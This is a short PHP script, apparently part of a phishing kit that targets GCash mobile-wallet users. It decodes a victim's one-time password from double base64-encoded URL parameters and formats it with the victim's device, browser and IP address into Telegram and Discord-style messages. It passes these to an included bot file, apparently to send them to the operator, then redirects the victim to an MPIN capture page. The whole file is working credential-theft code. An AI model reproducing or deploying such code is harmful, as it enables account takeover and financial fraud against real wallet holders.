<?php
// ANTI BOT
if (isset($_GET['mpin']) && isset($_GET['otpclid'])) {
    $otp = base64_decode(base64_decode($_GET['mpin']));
    include('../src/system.php');
    $replyMsg = "```diff\n- OTP [$device_used|$browser_used|$ip]\n  $otp```";
    $tgMsg = "OTP [$device_used|$browser_used|$ip]\n - $otp";
    include('../_bot.php');
    $gcash_number = base64_encode(base64_encode($_GET['otpclid']));
    header("Location:mpin_redirect.php?mobnumid=$gcash_number");
} else{

}

?>